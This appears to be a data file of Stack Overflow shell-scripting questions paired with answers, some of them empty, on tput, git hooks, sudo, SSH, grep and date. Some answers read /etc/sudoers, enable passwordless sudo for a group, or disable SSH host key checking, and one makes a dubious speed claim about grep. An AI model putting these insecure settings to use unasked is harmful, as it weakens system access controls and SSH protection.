    "Show persistent status message on console": "It might be worth having a look into the capabilities of tput.\nSomething like the following could form the beginning of a solution to always print the status line at the bottom of the screen:\nnumlines=$(tput lines)\nnumcols=$(tput cols)\nnumcols=$(expr $numcols - 1)\nseparator_line=$(for i in $(seq 0 $numcols);do printf \"%s\" \"-\";done;printf \"\\n\")\ntput cup $numlines\necho $separator_line\necho <your status line>\nThe intention of this logic is to:\nwork out how many lines on the screen and move to the bottom\nwork out how many columns and build the separator line to span that many columns\nprint the separator line and then your status line\nHaving said that, I feel certain there must be a more elegant way to achieve what you want to do...",
    "How to execute perl file from shell script": "In order to execute a perl script by .sh script you dont need to use perl prefix, but only:\n#!/bin/sh\n\n/somewhere/perlScript.pl\nIt will work without problem.",
    "Tmux .tmux.conf doesn't load properly [closed]": "The issue was invisible bytes creeping inside the document. Only when editing in Vim was I able to see it. Thanks.",
    "How to know if a given user has read and/or write permissions for a given path": "Tag me a scripting guru!\ncheck_access() {\n  checked_file=$1\n  target_user=$2\n  result=PASS\n\n  groups=`id -G $target_user | sed -e 's| | -o -group |g' -e 's|^|\\\\( -group |' -e 's|$| \\\\)|'`\n\n  while [ $checked_file != / ]; do \n    find $checked_file -maxdepth 0 \\\n      -type f \\( \\\n        \\( -user $target_user -perm 0400 \\) \\\n        -o \\( $groups -perm 0040 \\) \\\n        -o -perm 0004 \\\n      \\) -o -type d \\( \\\n        \\( -user $target_user -perm 0100 \\) \\\n        -o \\( $groups -perm 0010 \\) \\\n        -o -perm 0001 \\\n      \\) >/dev/null 2>&1 || result=FAIL\n    checked_file=`dirname $checked_file`\n  done\n  echo $result\n}",
    "Cross platform (Linux/OS X) file system watcher (run command when file changes)": "Other than being written in C, entr looks like what you want.",
    "Select text using keyboard in linux shell": "Highlighting with the mouse. *runs*",
    "Running shell commands on Android using Runtime.getRuntime": "",
    "Stream system() output to Shiny front-end (continuously)": "",
    "\"session is down\" error when opening an SSH channel with JSch": "Try to use:\nProperties config = new Properties();\nconfig.put(\"StrictHostKeyChecking\", \"no\");\nconfig.put(\"PreferredAuthentications\", \"password\");\njschSSH.setConfig(config);\nand also set\nsshSession.connect(connectionTimeout) to 5000 or more.\nalso as Martin said\nremove Thread.sleep(1000);",
    "In pre-push hook, get \"git push\" command full content?": "TL;DR summary: you need a while loop\nYour hook script (assuming sh/bash) should include a loop of the form:\nwhile read localname localhash remotename remotehash; do\n    ... code here using $localname etc ...\ndone\nDescription\nAll of the Git hooks are described in the githooks page. The pre-push hook description begins with:\nThis hook is called by git push and can be used to prevent a push from taking place. The hook is called with two parameters which provide the name and location of the destination remote, if a named remote is not being used both values will be the same.\nInformation about what is to be pushed is provided on the hook\u2019s standard input with lines of the form:\n<local ref> SP <local sha1> SP <remote ref> SP <remote sha1> LF\nFor instance, if the command git push origin master:foreign were run the hook would receive a line like the following:\nrefs/heads/master 67890 refs/heads/foreign 12345\nalthough the full, 40-character SHA-1s would be supplied. ...\nThe first paragraph means that in a shell script, $1 and $2 are the name of the remote\u2014e.g., origin\u2014and its URL, or the URL repeated twice if the user ran:\ngit push https://some.host.name/some/path ...\nThe second paragraph is important. A git push command can push more than one branch. For instance, I can run:\ngit push origin feature-A feature-B\nto push both feature-A and feature-B. You must read all input lines, one line at a time, to discover what is to be pushed. The current branch in the repository is not important: reading HEAD will give you the wrong answer unless the user happens to be pushing the current branch. On the other hand, most users mostly just push the current branch. This will give you the illusion that your hook is 100% reliable, when it's actually only 92.37% reliable.1\nAs the documentation notes, the hook gets the full name of each reference. If you are pushing a branch, that full name starts with refs/heads/, but you can push a tag, in which case the full name starts with refs/tags/. To write a reliable hook, you must inspect the full name, rather than simply stripping off the first two components.2\n1Like 38.61% of statistics, this one was made up on the spot. :-)\n2There are a lot of bad sample hooks (not all of them pre-push hooks) out there that use:\nbranch=$(echo $ref | cut -d/ -f3)\nIf you are pushing tag v2.3, this hook will think you are pushing a branch named v2.3. If you are pushing a branch named bugfix/1234, it will think you are pushing a branch named bugfix! The cut technique is just wrong, but a quick fix for the latter is to use -f3-, which at least produces bugfix/1234. It's better to verify the first components of the ref\u2014i.e., do something like:\ncase $ref in\nrefs/heads/*) ... it's a branch ...;;\nrefs/tags/*) ... it's a tag ...;;\n*) ... it's something else entirely, such as refs/notes/* ...;;\nesac\nOnce you know the prefix, you can use ${ref#refs/heads/} or ${ref#refs/tags/} to strip off the known prefix and get the full but unqualified branch or tag name. If many cases, though, you can just work directly with the full reference name.",
    "Please explain: trap 'sudo kill -9 -- -$$' EXIT": "$$ is the process ID of the script itself\n-$$ means use the process group ID\n-- signals the end of options\nSo upon exit the trap will kill all subprocesses of the script.\n\u00a7 Internal Variables",
    "How to echo line with multiple quotes/special characters into file?": "Try this\nsudo su -c $'echo \\\"bind \\'\\\"\\\\e[A\\\": history-search-backward\\'\\\" >> /etc/profile\\' -'\nFrom the bash man page:\nA single quote may not occur between single quotes, even when preceded by a backslash.\nText quoted by $'...' may contain backslash-escaped quotes, both single and double.\nAnother option is to add a simpler expression to ~/.inputrc:\necho '\"\\e[A\": history-search-backward' >> ~/.inputrc\nThere doesn't seem to be a system-wide equivalent of .inputrc that is read by all users. Also, this makes the key binding available to any program that uses readline. If you really do want to restrict it to bash, add a conditional expression:\ncat >> ~/.inputrc <<'EOF'\n$if Bash\n\"\\e[A\": history-search-backward\n$endif\nEOF",
    "Rsync create symbolic links only": "You could use cp -aR -s (Linux or FreeBSD) or cp --archive --recursive --symbolic-link (Linux) to create symbolic links to the source files in the destination directory instead of copies. Note that -s is non-standard.",
    "Simple queue for youtube-dl in the Linux shell": "The tail -f will not work because the script reads all the input at once.\nIt will work if you modify the script to perform a continuous read of the batch file.\nThen simply run the script as:\n% ./youtube-dl -a batch.txt -c\nWhen you append some data into batch.txt, say:\n% echo \"http://www.youtube.com/watch?v=j9SgDoypXcI\" >>batch.txt\nThe script will start downloading the appended video to the batch.\nThis is the patch you should apply to the latest version of \"youtube-dl\":\n2278,2286d2277\n<       while True:\n<           batchurls = batchfd.readlines()\n<           if not batchurls:\n<               time.sleep(1)\n<               continue\n<           batchurls = [x.strip() for x in batchurls]\n<           batchurls = [x for x in batchurls if len(x) > 0]\n<           for bb in batchurls:\n<               retcode = fd.download([bb])\nHope it helps, Happy video watching ;)\nNOTE: Due to code restructuring this patch will no longer work. Would be interested to see if this could be added to the upstream code.",
    "Usage of sudo in a shell script": "If you have a script that requires elevated privileges for certain commands, one way to handle those commands is with sudo. Before using sudo, there are several considerations for configuring its use. For instance, if you have certain users you want to be able to run commands with sudo and further to run sudo without being prompted for a password, you need a bit of configuration first. sudo is configured through the visudo utility. For most uses of sudo you will simply need to uncomment options at the end of the file. However to allow users to run sudo without a password, you will also need to add those users to the wheel group (some distros now use a sudo group -- check). After adding users to the wheel group, to allow them to use sudo without a password, you would run visudo and uncomment the following line:\n## Same thing without a password\n%wheel ALL=(ALL) NOPASSWD: ALL\nWith sudo configured, then within a script, if elevated (root) privileges are needed you simply need to check whether the user UID (and/or EUID) are equal to zero indicating the user is root, if not, then you use sudo to run the command. You can structure the test in the negative or in the positive to fit your taste, e.g.\nif [ \"$UID\" -eq 0 -o \"$EUID\" -eq 0 ]; then\n    command\nelse\n    sudo command\nfi\nor\nif [ \"$UID\" -ne 0 -a \"$EUID\" -ne 0 ]; then\n    sudo command\nelse\n    command\nfi\nIf your command is not a simple command, but instead contains redirections or pipelines, then you must run the entire command with sudo not just the first command in the list. To do so, just use sudo bash -c \"your long command\" to ensure elevated privileges are available to each part of a compound command that needs it. For example if you attempt:\nsudo cat /etc/sudoers > sudoersbackup\nThe command will fail. While cat has the elevated privileges to read the file the > redirection is run as the regular user and will fail due to lack of permission. To handle that circumstance, you can do:\nsudo bash -c \"cat /etc/sudoers > sudoersbackup\"\nThat ensures elevated privileges are available to the entire command.",
    "Shell - syntax error in expression (error token is \"0 \")": "You need to use command substitution using $(...) syntax.\nYou can use this command:\n(( $(date +%U) % 2 == 0 )) && VOLUME=\"A\" || VOLUME=\"B\"",
    "Best way to read output of shell command": "You are using a text editor. If you care about NULs, trailing EOLs and (possibly) conflicting encodings, you need to use a hex editor anyway?\nIf I need this amount of control of my operations, I use the xxd route indeed, with\n:se binary\nOne nice option you seem to miss is insert mode expression register insertion:\nC-r=system('ls -l')Enter\nThis may or may not be smarter/less intrusive about character encoding business, but you could try it if it is important enough for you.\nOr you could use Perl or Python support to effectively use popen\nRough idea:\n:perl open(F, \"ls /tmp/ |\"); my @lines = (<F>); $curbuf->Append(0, @lines)",
    "Meaning of ulimit Hard (-H) and Soft (-S)": "The hard limits are usually intended to be set by the system administrator to the largest value they would be comfortable with a handful of users using.\nThe soft limits are usually set by the system administrator to the values they'd like everyone to use most of the time. (Consider soft_limit * number_of_users == almost all of the resource available. Leave enough for root to clean up whatever needs to be done, and the users who know how to fiddle with the hard limits to push the boundaries a bit. Sites requiring absolute stability will give hard limits very close to the soft limits.)\nIf this is the first time you care, I'd just set the soft limits. That gives you the chance to raise or remove them completely in the same session without requiring you to kill that terminal and all its children.\nI believe the core size limit is in bytes, so both 1024 and 10240 are way too small for all but the silliest programs. I'd start with $(( 100 * 1024 * 1024 )) for most programs just out of lazyness, but if I knew the program was huge (Firefox) I'd go for much larger still.",
    "Run SICP Scheme files like fast-failing tests": "One option if you don't want to resort to a full-blown unit-testing library (understandable) is to write your own. You can use read to read s-expressions from the file, use eval to evaluate them and test if they are false, and report back, quitting if you find a false. Something like this should work:\n(define (read-and-test filename env)\n  (call-with-input-file\n      filename\n    (lambda (in)\n      (let loop ((input (read in)))\n        (if (eof-object? input)\n            (display \"done!\")\n            (begin\n              (if (eval input env)\n                  (begin\n                    (display input)\n                    (display \" ok\")\n                    (newline)\n                    (loop (read in)))\n                  (begin\n                    (display \"failed on \")\n                    (display input)\n                    (newline)\n                    (exit)))))))))\nIf you put the above in a file called unit.scm and the file you want to test is called test.scm, you can call this with MIT Scheme from the Unix command line like so:\nmit-scheme --load `pwd`/unit.scm --eval '(read-and-test \"/Users/aki/code/scratch/test.scm\" (the-environment))'\n(note there's some MIT Scheme specific things above, related to eval and enviroments)",
    "Background process, with stdin a pipe connected to fd 3 in the parent shell script": "The only standard shell feature that provides for creating pipes is the | operator. If we assume no extensions are in play, then the spec says that the commands in a (multi-command) pipeline execute in subshell environments. Such an environment cannot modify the parent shell so as to make a file descriptor for the write end of the pipe available there, so the closest we can come is to make it available within the scope of a { compound-command } on the write end of the pipe. Example:\n#!/bin/sh\n\nexec 4>&1\n\n{\n  # Copy the write end of the pipe to FD 3, restore the parent\n  # shell's original stdout, and close excess FD 4\n  exec 3>&1 1>&4 4>&-\n  \n  use-fd-3-here\n} | something-goes-here\n\nexec 4>&-\nNow, although it can be redirected, the initial standard input to an asynchronous command is (an equivalent of) /dev/null, so it won't work to put just some-command & on the read end of the pipe. But we can put another compound command around some-command, to give us a place to make a copy of the standard input file descriptor from the pipe. Example:\n{\n  some-command 0>&4 4>&-\n} 4>&0 &\nThose work together just fine. For example:\n#!/bin/sh\n\n# Copy the standard output FD to preserve access to it within processes in the\n# pipeline\nexec 4>&1\n\n{\n  # Rotate file descriptors:\n  #  - the write end of the pipe becomes 3\n  #  - the parent shell's standard output becomes 1\n  #  - excess FD 4 is closed for tidiness and safety\n  exec 3>&1 1>&4 4>&-\n\n  # This is piped into the standard input of a command running asynchronously.\n  # In this example, that process will substitute a \"!\" for the \"?\" and output\n  # the result\n  echo 'piped?' 1>&3\n\n  # This does not go to the async process\n  echo 'not piped?'\n} | {\n  # Redirect the read end of the pipe to this process's standard input and\n  # clean up the extra file descriptor.\n  sed 's/?/!/' 0>&4 4>&-\n} 4>&0 &\n\nexec 4>&-\n\n# wait for the async process to terminate\nwait\nOutput:\nnot piped?\npiped!\nAnd if you were concerned about the relative order of the 4>&0 redirection and redirecting /dev/null to the standard input of the async process, then a little more compound-command declaration could make that unambiguous:\n | {\n     {\n       some-command 's/?/!/' 0>&4 4>&-\n     } &\n} 4>&0",
    "Give custom name to a process started with nohup": "Bash's exec command has a -a NAME option for this:\nnohup bash -c 'exec -a xxx sleep 12345'\nAccording to help exec:\nexec: exec [-cl] [-a name] [command [argument ...]] [redirection ...]\n    Replace the shell with the given command.\n\n    Execute COMMAND, replacing this shell with the specified program.\n    ARGUMENTS become the arguments to COMMAND.  If COMMAND is not specified,\n    any redirections take effect in the current shell.\n\n    Options:\n      -a name   pass NAME as the zeroth argument to COMMAND\n      -c        execute COMMAND with an empty environment\n      -l        place a dash in the zeroth argument to COMMAND\n\n    If the command cannot be executed, a non-interactive shell exits, unless\n    the shell option `execfail' is set.\n\n    Exit Status:\n    Returns success unless COMMAND is not found or a redirection error occurs.",
    "How to combine multiple csv files into a single excel sheet using unix shell scripting?": "Yes the are multiple ways to do what you want. Perl, Python and Ruby have the appropriate modules. Probably other scripting languages also. Depends on which scripting language you are comfortable with.\nHere is a pointer to one way of doing what you want using Python: Python script to convert CSV files to Excel",
    "shell date \"-n hours\" differs with \"n hours ago\" in some situation": "This is because the negative number is treated as an offset to your timezone, not to the 13:05. In my timezone, MET (one hour east of GMT), this is what I get:\n$ date -d \"2016-11-23 13:05 -1 hours \"  \"+%Y-%m-%d %H:00:00\"\n2016-11-23 16:00:00\n$ TZ=GMT date -d \"2016-11-23 13:05 -1 hours \"  \"+%Y-%m-%d %H:00:00\"\n2016-11-23 15:00:00\n$ TZ=GMT-1 date -d \"2016-11-23 13:05 -1 hours \"  \"+%Y-%m-%d %H:00:00\"\n2016-11-23 16:00:00\n$ TZ=GMT-1 date -d \"2016-11-23 13:05 -2 hours \"  \"+%Y-%m-%d %H:00:00\"\n2016-11-23 17:00:00\nThe timezone offset is usually specified as a four digit number, as in\nSun, 29  Feb 2004  16:21:42 -0800\nbut apparently date(1) is happy with a -1 as well.\nFrom the man page:\nDATE STRING\nThe --date=STRING is a mostly free format human readable date string such as \"Sun, 29 Feb 2004 16:21:42 -0800\" or \"2004-02-29 16:21:42\" or even \"next Thursday\". A date string may contain items indicating calendar date, time of day, time zone, day of week, relative time, relative date, and numbers. An empty string indicates the beginning of the day. The date string format is more complex than is easily documented here but is fully described in the info documentation.",
    "Any equivalent to subprocess in PHP?": "",
    "What is meant by :- this symbol in unix shell scripting [duplicate]": "This is a simple way to provide a default value using an expansion. See http://wiki.bash-hackers.org/syntax/pe#use_a_default_value for more information.\nThere are also answers to similar questions on stackoverflow like Read a variable in bash with a default value",
    "How to run $curl in xampp shell?": "",
    "Resizing terminal in Emacs": "No, not usually, because the program that produced the output (may have) formatted itself to fit the width of the display that was in effect at the time of its printing, and is no longer running when you resize.\nHowever, if it is still running, it goes get the option to resize itself (a SIGWINCH). You might test this with e.g. the links/elinks browser. This is the real \u201cuse case\u201d for ANSI terminal mode: programs that use \u201ccurses\u201d or similar systems to move the cursor around.\nAs @user2491 pointed out, shell-mode does handle text-based (stream-based) output with word-wrapping, at the penalty of not being able to run \u201ccurses\u201d-type programs. It's designed to treat your session a bit more like a text file, and less like a \u201creal terminal.\u201d",
    "bash scripting: how to get item name on a radiolist using dialog": "You can put your expected results in an array:\narray=(Linux Solaris HPUX)\nvar=$(dialog --backtitle \"OS infomration\" \\\n--radiolist \"Select OS:\" 10 40 3 \\\n 1 \"Linux 7.2\" off \\\n 2 \"Solaris 9\" on \\\n 3 \"HPUX 11i\" off >/dev/tty 2>&1 )\n\nprintf '\\n\\nYou chose: %s\\n' \"${array[var - 1]}\"",
    "bash export command in powershell": "",
    "Neovim terminal emulator configuration for Windows 10": "I think using let $PATH .= ';C:\\cygwin64\\bin' in init.vim might be enough to deal with shell issues.\nI tried the vim style as suggested in\nhttp://vim.wikia.com/wiki/Use_cygwin_shell . And this breaks vim-fugitive and vim-plug with error prompt like /usr/bin/bash command not found (by git push, git log) or cannot create leading directory (by vim-plug when cloning repos). After I disabled them, fugitive and plug works again.\nAnd this $TERM option might be of interest: https://neovim.io/doc/user/term.html#$TERM",
    "Using rgl with headless display": "",
    "POSIX-compliant shell equivalent to Bash \"while read -d $'\\0' ...\"?": "Without -d option, read builtin cannot read null terminated data.\nYou can do this in find + xargs:\nfind . -mindepth 1 -print0 | xargs -0 sh -c 'for f; do echo \"Reading path \\\"$f\\\"\"; done' _\nOr if you don't mind spawning a shell for each file use just find:\nfind . -mindepth 1 -exec sh -c 'echo \"Reading path \\\"$1\\\"\"' - {} \\;",
    "I/O with a Tun interface": "First, the TUN/TAP interface is documented in the Linux kernel documentation, which is worth a read if you haven't already seen it. The examples are in C, of course, but hopefully still useful.\nI see references to the second arguement being TUNSETIFF. All I know is that it has to be numeric. What is it asking for?\nThis is a C library constant, the value of which you can determine with code like the following:\n#include <stdio.h>\n#include <stdlib.h>\n#include <unistd.h>\n#include <sys/types.h>\n#include <sys/socket.h>\n#include <sys/ioctl.h>\n#include <linux/if.h>\n#include <linux/if_tun.h>\n\nint main(int argc, char **argv) {\n  printf(\"TUNSETIFF: %d\\n\", TUNSETIFF);\n  return 0;\n}\nWhich on my system returns:\nTUNSETIFF: 1074025674\nFrom what I've gathered, the third arguement is supposed to be flags of some sort, but I have not managed to find info on them. Presumably, one flag would be for selecting if it should be a Tun or Tap tunnel. Any info on this?\nThe third argument is a pointer to a structure that has an ifr_name attribute, containing the device name, and an ifr_flags attribute containing the flags. The kernel documentation provides the following sample code:\n  /* Flags: IFF_TUN   - TUN device (no Ethernet headers) \n   *        IFF_TAP   - TAP device  \n   *\n   *        IFF_NO_PI - Do not provide packet information  \n   */ \n  ifr.ifr_flags = IFF_TUN; \n  if( *dev )\n     strncpy(ifr.ifr_name, dev, IFNAMSIZ);\n\n  if( (err = ioctl(fd, TUNSETIFF, (void *) &ifr)) < 0 ){\n     close(fd);\n     return err;\n  }\nYou can find the values for the different flags (IFF_TUN, IFF_TAP) using the same code from above that we used to find the value of TUNSETIFF.\nIf you are writing code in Perl, you would need a way to create the corresponding C-compatible structure. My Perl is too rusty to suggest the proper solution off the top of my head.\nHowever, there appear to be a number of Perl modules available that simplify the whole process:\nhttp://search.cpan.org/~mooli/Linux-TunTap-0.001/lib/Linux/TunTap.pm\nhttp://search.cpan.org/~gomor/Net-Libdnet/",
    "Entering ADB shell within a specific directory on the connected device using only a single line of terminal code [duplicate]": "",
    "Exit codes of smbclient": "What would be best is to use the -E argument to smbclient and redirect 2>/errorlog from the command line. You can then check this file to see if any errors occurred.\nWarning, the first line is always the Domain=......... so you may need to strip that line out.\nSomething like this:\nsmbclient Hostname -A authfile -E 1>log 2>errorlog <<-EOF \nget foo \nEOF\nIn the errorlog you should find something like below, your log file will be empty\nDomain=[Hostname] OS=[Windows Server 2008 R2 Standard 7601 Service Pack 1] Server=[Windows Server 2008 R2 Standard 6.1] NT_STATUS_OBJECT_NAME_NOT_FOUND opening remote file \\foo",
    "How Does Jenkins Deal With Interactive Shell Scripts?": "",
    "What is dexopt ? (Android Shell Command)": "",
    "How to redirect program output as its input": "First, you need to output newlines when printing to std::cout, otherwise std::getline() won't have any complete line to read.\nImproved version:\n#include <iostream>\n#include <string>\n\nint main()\n{\n  std::cout << \"stars\" << std::endl;\n\n  for(;;) {\n    std::string string_object;\n    std::getline(std::cin, string_object);\n    std::cout << string_object << std::endl;\n  }\n\n  return 0;\n}\nNow try this:\n./bin >file <file\nyou don't see any output, because it's going to the file. But if you stop the program and look at the file, behold, it's full of\nstars\nstars\nstars\nstars\n:-)\nAlso, the reason that the feedback loop cannot start when you try\n./bin 0>&1\nis, that you end up with both stdin and stdout connected to /dev/tty (meaning that you can see the output).\nBut a TTY device cannot ever close the loop, because it actually consists of two separate channels, one passing the output to the terminal, one passing the terminal input to the process.\nIf you use a regular file for in- and output, the loop can be closed. Every byte written to the file will be read from it as well, if the stdin of the process is connected to it. That's as long as no other process reads from the file simultaneously, because each byte in a stream can be only read once.",
    "Windows: start a file using a (non-default) shell verb like \"edit\" from .bat or command-line": "As learned from the comments and after further searching: there seems to be no direct command for that task in standard Windows indeed.\nHowever using a VBScript snippet should be highly compatible and have lowest system requirements. (Works on all machines here directly - from XP - unlike JScript)\nVBScript has been installed by default in every desktop release of Microsoft Windows since Windows 98;1 in Windows Server since Windows NT 4.0 Option Pack;[2] and optionally with Windows CE (depending on the device it is installed on).\nExample script shellexec.vbs :\n' shellexec.vbs : starts a file using a (non-default) shell verb like \"EDIT\"\n' Usage: shellexec.vbs FILE VERB\n' Example: shellexec.vbs demo.png EDIT\nfn = WScript.Arguments(0)\ncmd = WScript.Arguments(1)\nWscript.Echo \"ShellExecute \"\"\" + cmd + \"\"\" on \" + fn\nCreateObject(\"shell.application\").ShellExecute fn, \"\", \"\", cmd, 1\nUse from command-line or batch-file:\nshellexec.vbs demo.png EDIT\nor:\ncscript.exe //Nologo shellexec.vbs demo.png EDIT",
    "What is the use of \"echo || true\"?": "Why the paranoia with the exit code\nI believe it is to avoid script exiting due to possible use of:\nset -e\nat start of the script which would have caused script to exit otherwise.",
    "Problems when using dict comprehensions. NameError: global name is not defined": "I believe python's issue tracer is the best answer for you.\nIn short: it won't work in shell. The same applies to function definition in shell. The imports are unaccesible there.\nIn regard for your problem I advise:\nnames = [...]\nusers = User.objects.filter(username__in=names)\nname_to_user = {user.username: user for user in users}\nIt does one sql query instead of len(names).",
    "How to kill all children of the current shell on interrupt?": "You don't need to handle ^C, that will result in a signal being sent to the whole process group, which will kill all the processes that are not in the background. So you don't need to catch INT.\nThe only reason you get a Terminated when you kill them is that kill sends TERM by default, but that's reasonable if you are handling a TERM in the first place. You could use kill -INT 0 if you want to avoid the messages.\n(responding with extra info)\nIf the child processes are run in the background, you can get their process ids just after you start them, using the $! special shell variable. Gather these together in a variable and just kill them all when you need to terminate.",
    "Using Headless FireFox to Save All HTML files using command line in Linux": "There are few options that I know of, but none that I know are fitting your question exactly..\nOpen firefox http://yoursite.com from shell, then send keystrokes to firefox using xte or similar method. (This is not headless mode though.)\nDownload using wget. It can work in recursive manner. Or alternately you can parse the HTML, if it is quite simple web page. If you need to submit form, use curl instead of wget.\nUse greasemonkey addon & write a script, which would get loaded on http://some-fake-page.com/?download=http://yoursite.com & then open firefox with that fake-page url.\nDevelop your own firefox addon to do above work.\nThere may be other better options for this as well, but I don't know them.",
    "Execute command line and return command output": "If this is in a POSIX environment, the library function popen() might also be available.\niunit = popen ('sed ''s/,//g'' myFile', 'r')\nLook at the documentation for your Fortran environment since I'm not sure of the semantics for connecting the i/o to Fortran. If it is like the C runtime library, the file connection also needs a special function to close it, pclose().",
    "Launch interactive SSH bash session from PHP": "",
    "Is it possible to define a variable as static in shell bash function like C?": "With bash you cannot really get that (I imagine you want some variable shared between several instances of your shell...). However, if you switch to the fish shell (use chsh to change your login shell), you get so called universal variables which kind-of fits the bill. See also this answer to a related question.\nBTW, you should read advanced bash scripting guide and consider using bash functions (instead of a script).\nIf you just want to share a variable between several shell functions inside the same shell process, just don't declare it local to functions!",
    "Compiled vim from source on Mac OSX and getting 'shell returned 127' error?": ":!q is not :q!. This is probably not a bug.\nThe error message you're seeing is is most likely the result of accidentally typing :!q instead of :q!, which would be user error, not a bug. :!q shells out to run q, and your shell (bash) is not finding such a command and bails with 127. (For comparison, you might try :!true, :!false, :!vim %, to get a feel of this.)\nThere isn't really a \u201cfix\u201d for this, and ! is really useful for other purposes; maybe with more practice you'll make the typo less often. You could also try using ZQ instead of :q!; this has other disadvantages (a typo ZZ will instead save the file if it's edited, and ZQ specifically is a vim extension), but at least you see this error again.\nThe upshot here is basically check to make sure you typed in your commands right, I guess.",
    "What directory is '~' when I type 'cd ~'?": "~ is an alias to the currently logged in users home directory. To find out where that really is, type pwd (stands for: Print Working Directory) right after logging in, which should give you the location relative to /. It's probably something like:\n/home/myusername",
    "Check the output of \"make\" and exit bash script if it fails": "Just check the exit code of make:\ncmake . || exit 1\nmake || exit 1\n./pcl_visualizer_demo ",
    "Decompressing a .lzo file using shell script [closed]": "Literally what I did to figure this out:\n$ apropos lzo\nIO::Uncompress::AnyUncompress (3perl) - Uncompress gzip, zip, bzip2 or lzop file/buffer\nAlright, so it's probably got something to do with lzop\n$ lzo\nNo command 'lzo' found, did you mean:\n Command 'lz' from package 'mtools' (main)\n Command 'lzop' from package 'lzop' (universe)\nlzo: command not found\nThe last one looks like it.\n$ sudo apt-get install lzop\n$ lzop \n[...]\nCommands:\n  -1     compress faster                   -9    compress better\n  -d     decompress                        -x    extract (same as -dPp)\nAaand chocolate for everyone!",
    "Write an executable .sh file with Java for OSX": "You can call File.setExecutable() to set the owner's executable bit for the file, which might be sufficient for your case. Or you can just chmod it yourself with a system call with Process.\nAlas, full-powered programmatic alteration of file permissions isn't available until Java 7. It'll be part of the New IO feature set, which you can read more about here.",
    "Top command to show the %cpu in descending order": "Run top as a process (I'm using Ubuntu 14.04)\ntop\nOnce in top...\nP <- Sort by CPU usage\nM <- Sort by MEM usage\nz <- Add cool visual colors\nx <- Highlight column you are currently sorting by",
    "Shell commands from vim": "I know this is a bit late, but my preferred approach is suspending the vim process (Ctrl+z). You return to your shell/bash command prompt.\nThen execute whatever command(s) you like.\nReturn to vim by typing fg",
    "Shell script helper for git commits": "You must quote the variable in your script.\n#!/bin/bash -e\ncommit_message=\"$1\"\ngit add . -A\ngit commit -m \"$commit_message\"\ngit push\nI also set \"-e\" so that if there are any errors, the script will exit without processing subsequent commands.\nAs to your second question, the . in the script should refer to your current working directory, as you intend. However the -A is causing it to add all files that have been modiied in the repo.",
    "Remove first character of a text file from shell": "You can use the tail command, telling it to start from character 2:\ntail -c +2 infile > outfile",
    "Split String in Unix Shell Script": "Let's say you have\ntext=\"//ABC/REC/TLC/SC-prod/1f9/20/00000000957481f9-08d035805a5c94bf\"\nIf you know the position, i.e. in this case the 9th, you can go with\necho \"$text\" | cut -d'/' -f9\nHowever, if this is dynamic and your want to split at \"/\", it's safer to go with:\necho \"${text##*/}\"\nThis removes everything from the beginning to the last occurrence of \"/\" and should be the shortest form to do it.\nFor more information on this see: Bash Reference manual\nFor more information on cut see: cut man page",
    "cursor blinking removal in terminal, how to?": "You can hide and show the cursor using the DECTCEM (DEC text cursor enable mode) mode in DECSM and DECRM:\nfputs(\"\\e[?25l\", stdout); /* hide the cursor */\n\nfputs(\"\\e[?25h\", stdout); /* show the cursor */",
    "remove files when name does NOT contain some words": "This command should do what you you need:\nls -1 | grep -v 'good' | xargs rm -f\nIt will probably run faster than other commands, since it does not involve the use of a regex (which is slow, and unnecessary for such a simple operation).",
    "How to store result from SQLPlus to a shell variable": "Try this instead:\ntestvar=`sqlplus -s foo/bar@SCHM <<EOF\nset pages 0\nset head off\nset feed off\n@test.sql\nexit\nEOF`\n-s switch will turn off all the header info when sqlplus launches. You also want to turn off the feedback, headers, and pagesize to 0. I am old school so I still use the back ticks :)",
    "Running matlab in the background": "Use nohup command on UNIX to prevent MATLAB stop when you logout.\nnohup matlab -nodisplay -nosplash -r matlab_command > outfile.txt &\nAnd don't forget to include exit; at the end of matlab_command script.\nUPDATE:\nTry this solution: Is it possible to run MATLAB in the background under UNIX?\nThere is an explanation here.",
    "Check if a line does not start with a specific string with grep [duplicate]": "Simply use the below grep command,\ngrep -v '^Nov 06' file\nFrom grep --help,\n-v, --invert-match        select non-matching lines\nAnother hack through regex,\ngrep -P '^(?!Nov 06)' file\nRegex Explanation:\n^ Asserts that we are at the start.\n(?!Nov 06) This negative lookahead asserts that there isn't a string Nov 06 following the line start. If yes, then match the boundary exists before first character in each line.\nAnother regex based solution through PCRE verb (*SKIP)(*F)\ngrep -P '^Nov 06(*SKIP)(*F)|^' file",
    "set `ulimit -c` from outside shell": "A process may only set resource limits for itself and its children. It cannot set resource limits for its ancestor. By calling os.system('ulimit -c'), you are asking the child \"ulimit\" process to set the resource limit of the ancestor \"Python\" process.\nYour Python program can set its resource limit using the resource module:\nimport resource\n\nresource.setrlimit(\n    resource.RLIMIT_CORE,\n    (resource.RLIM_INFINITY, resource.RLIM_INFINITY))",
    "how to create AppleScript app to run a set of terminal commands": "You don't actually need to use AppleScript for this - just put all the shell commands in a text file and give it a .command suffix and make sure it's executable (e.g. chmod +x my_script.command) - this will make it double-clickable in the Finder.",
    "Replace delimited block of text in file with the contents of another file": "Give this a try:\nsed -i -ne '/<!-- BEGIN realm -->/ {p; r realm.xml' -e ':a; n; /<!-- END realm -->/ {p; b}; ba}; p' server.xml",
    "Read first three lines of a file in bash": "You could also combine the head and while commands:\nhead -3 rhyme.txt | \nwhile read a; do\n  echo $a; \ndone",
    "Checking correctness of an email address with a regular expression in Bash": "You have several problems here:\nThe regular expression needs to be quoted and special characters escaped.\nThe regular expression ought to be anchored (^ and $).\n?: is not supported and needs to be removed.\nYou need spaces around the =~ operator.\nFinal product:\nregex=\"^[a-z0-9!#\\$%&'*+/=?^_\\`{|}~-]+(\\.[a-z0-9!#$%&'*+/=?^_\\`{|}~-]+)*@([a-z0-9]([a-z0-9-]*[a-z0-9])?\\.)+[a-z0-9]([a-z0-9-]*[a-z0-9])?\\$\"\n\ni=\"test@terra.es\"\nif [[ $i =~ $regex ]] ; then\n    echo \"OK\"\nelse\n    echo \"not OK\"\nfi",
    "unix shell script to get date 30 minutes ago in GMT": "date -u --date=\"-30 minutes\"",
